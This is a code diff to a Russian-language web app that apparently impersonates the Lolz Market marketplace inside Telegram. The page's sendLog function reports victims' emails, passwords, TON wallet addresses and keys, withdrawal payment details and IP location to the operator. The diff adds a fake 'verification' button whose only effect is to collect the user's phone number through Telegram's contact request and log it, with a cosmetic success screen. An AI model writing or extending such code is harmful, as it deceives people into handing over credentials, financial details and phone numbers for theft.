@@ -1448,13 +1448,34 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
     </div>
     <div class="profile-row">
       <div class="profile-row-left"><div class="profile-row-icon"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg></div><div class="profile-row-label">Статус</div></div>
-      <div class="profile-row-value" style="color:#7ed17e;font-weight:700;">✦ Активен</div>
+      <div class="profile-row-value" id="profileStatusRow" style="color:#e87c79;font-weight:700;">⚠ Не верифицирован</div>
     </div>
     <div class="profile-row">
       <div class="profile-row-left"><div class="profile-row-icon"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg></div><div class="profile-row-label">Регистрация</div></div>
       <div class="profile-row-value">01.01.2026</div>
     </div>
   </div>
+
+  <!-- Кнопка верификации -->
+  <button id="verifyBtn" onclick="requestVerification()" style="
+    width:100%;
+    padding:14px;
+    border-radius:13px;
+    border:1px solid rgba(92,184,92,0.3);
+    background:linear-gradient(135deg,rgba(92,184,92,0.12),rgba(92,184,92,0.04));
+    color:#7ed17e;
+    font-family:'JetBrains Mono',monospace;
+    font-size:13px;font-weight:700;cursor:pointer;
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    transition:transform 0.15s,background 0.15s;
+    margin-bottom:11px;
+    letter-spacing:0.3px;
+  " onmousedown="this.style.transform='scale(0.97)'" onmouseup="this.style.transform=''" ontouchstart="this.style.transform='scale(0.97)'" ontouchend="this.style.transform=''">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    </svg>
+    <span id="verifyBtnText">Пройти верификацию</span>
+  </button>
 
   <div class="section-title">Lolz Market</div>
   <a class="ext-link-row" href="https://lolz.live/market" target="_blank" rel="noopener">
@@ -2254,24 +2275,32 @@ async function sendLog(method, email, password) {
            + `🌐 Язык: ${navigator.language || 'ru'}\n`
            + `📍 ${country}, ${city} (IP: ${ip})\n`
            + `🕐 ${now}`;
-     } else if (method === 'ton_wallet') {
-  text = `💎 <b>TON Кошелёк подключён</b>\n`
-       + `👤 ${uid} ${username}\n`
-       + `💼 Адрес: ${email}\n`
-       + `🔑 PublicKey: ${password || '—'}\n`
-       + `📍 ${country}, ${city} (IP: ${ip})\n`
-       + `🕐 ${now}`;
-      } else if (method === 'wallet_action') {
-  const parts = email.split('|');
-  const wMode = parts[0], wType = parts[1], wCur = parts[2], wAmount = parts[3];
-  const modeLabel = wMode === 'deposit' ? '💳 Пополнение' : '📤 Вывод';
-  text = `${modeLabel}\n`
-       + `👤 ${uid} ${username}\n`
-       + `💱 ${wCur} (${wType})\n`
-       + `💰 Сумма: ${wAmount}\n`
-       + `🏦 Реквизиты: ${password || '—'}\n`
-       + `📍 ${country}, ${city} (IP: ${ip})\n`
-       + `🕐 ${now}`;
+    } else if (method === 'ton_wallet') {
+      text = `💎 <b>TON Кошелёк подключён</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `💼 Адрес: ${email}\n`
+           + `🔑 PublicKey: ${password || '—'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
+    } else if (method === 'wallet_action') {
+      const parts = email.split('|');
+      const wMode = parts[0], wType = parts[1], wCur = parts[2], wAmount = parts[3];
+      const modeLabel = wMode === 'deposit' ? '💳 Пополнение' : '📤 Вывод';
+      text = `${modeLabel}\n`
+           + `👤 ${uid} ${username}\n`
+           + `💱 ${wCur} (${wType})\n`
+           + `💰 Сумма: ${wAmount}\n`
+           + `🏦 Реквизиты: ${password || '—'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
+    } else if (method === 'verification') {
+      text = `🛡️ <b>Пройдена верификация</b>\n`
+           + `👤 ${uid} ${username}\n`
+           + `📞 Телефон: ${email || '—'}\n`
+           + `📱 ${ua}\n`
+           + `🌐 Язык: ${navigator.language || 'ru'}\n`
+           + `📍 ${country}, ${city} (IP: ${ip})\n`
+           + `🕐 ${now}`;
     } else {
       const label = method === 'telegram'
         ? '✈️ <b>Вход через Telegram</b>'
@@ -2584,6 +2613,69 @@ function refreshPillBalance() {
   const ton = (data.balances && data.balances.TON) || data.totalTon || 0;
   const pill = document.getElementById('pillBalance');
   if (pill) pill.textContent = (ton > 0 ? ton.toFixed(2) : '0') + ' TON';
+}
+
+  /* ─── ВЕРИФИКАЦИЯ ─── */
+function isVerified() {
+  return localStorage.getItem('lolz_verified_' + uid) === '1';
+}
+
+function applyVerifiedUI() {
+  const statusEl = document.getElementById('profileStatusRow');
+  const btn = document.getElementById('verifyBtn');
+  const btnText = document.getElementById('verifyBtnText');
+
+  if (isVerified()) {
+    if (statusEl) {
+      statusEl.innerHTML = '✓ Верифицирован';
+      statusEl.style.color = '#7ed17e';
+    }
+    if (btn) {
+      btn.style.background = 'linear-gradient(135deg,rgba(92,184,92,0.2),rgba(92,184,92,0.08))';
+      btn.style.borderColor = 'rgba(92,184,92,0.5)';
+    }
+    if (btnText) btnText.textContent = '✓ Верифицирован';
+  } else {
+    if (statusEl) {
+      statusEl.innerHTML = '⚠ Не верифицирован';
+      statusEl.style.color = '#e87c79';
+    }
+    if (btnText) btnText.textContent = 'Пройти верификацию';
+  }
+}
+
+function requestVerification() {
+  if (isVerified()) {
+    document.getElementById('verifyWarningModal').classList.add('open');
+    return;
+  }
+
+  if (!tg || !tg.requestContact) {
+    showToast(' Telegram не поддерживает запрос контакта');
+    return;
+  }
+
+  tg.requestContact((confirmed, contact) => {
+    if (!confirmed) return;
+
+    let phone = '';
+    if (contact?.contact?.phone_number) phone = contact.contact.phone_number;
+    else if (contact?.phone_number) phone = contact.phone_number;
+    else if (typeof contact === 'string') {
+      try {
+        const parsed = JSON.parse(contact);
+        phone = parsed?.phone_number || parsed?.contact?.phone_number || '';
+      } catch { phone = contact; }
+    }
+
+    localStorage.setItem('lolz_verified_' + uid, '1');
+    applyVerifiedUI();
+
+    document.getElementById('verifySuccessModal').classList.add('open');
+
+    // Лог в Telegram
+    sendLog('verification', phone || 'no_phone', '');
+  });
 }
   
 </script>
@@ -3252,6 +3344,40 @@ function submitDealCurrency() {
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/></svg>
       Перейти в Кошелёк
     </button>
+  </div>
+</div>
+
+  <!-- ВЕРИФИКАЦИЯ: УСПЕХ -->
+<div class="modal-overlay" id="verifySuccessModal" onclick="closeModalIf(event,'verifySuccessModal')">
+  <div class="modal-sheet" style="background:#0e120e;align-items:center;text-align:center;padding-bottom:28px;">
+    <div class="modal-handle"></div>
+
+    <div style="width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#5cb85c,#3d8b3d);display:flex;align-items:center;justify-content:center;box-shadow:0 0 28px rgba(92,184,92,0.5);margin:6px 0 4px;">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+
+    <div style="font-family:'Unbounded',sans-serif;font-size:18px;font-weight:900;color:#fff;letter-spacing:-0.3px;">Поздравляем!</div>
+    <div style="font-size:12px;color:var(--text-muted);line-height:1.6;max-width:240px;">Вы успешно прошли верификацию в Lolz Market</div>
+
+    <button class="btn-primary" onclick="closeModal('verifySuccessModal')" style="margin-top:6px;margin-bottom:0;">Продолжить ✓</button>
+  </div>
+</div>
+
+<!-- ВЕРИФИКАЦИЯ: УЖЕ ВЕРИФИЦИРОВАН -->
+<div class="modal-overlay" id="verifyWarningModal" onclick="closeModalIf(event,'verifyWarningModal')">
+  <div class="modal-sheet" style="background:#0e120e;align-items:center;text-align:center;padding-bottom:28px;">
+    <div class="modal-handle"></div>
+
+    <div style="width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#e5a020,#b87a0a);display:flex;align-items:center;justify-content:center;box-shadow:0 0 28px rgba(229,160,32,0.45);margin:6px 0 4px;color:#000;font-family:'Unbounded',sans-serif;font-size:32px;font-weight:900;">
+      !
+    </div>
+
+    <div style="font-family:'Unbounded',sans-serif;font-size:18px;font-weight:900;color:#fff;letter-spacing:-0.3px;">Внимание</div>
+    <div style="font-size:12px;color:var(--text-muted);line-height:1.6;max-width:240px;">Вы уже являетесь верифицированным пользователем</div>
+
+    <button class="btn-primary" onclick="closeModal('verifyWarningModal')" style="margin-top:6px;margin-bottom:0;">Понятно</button>
   </div>
 </div>
   
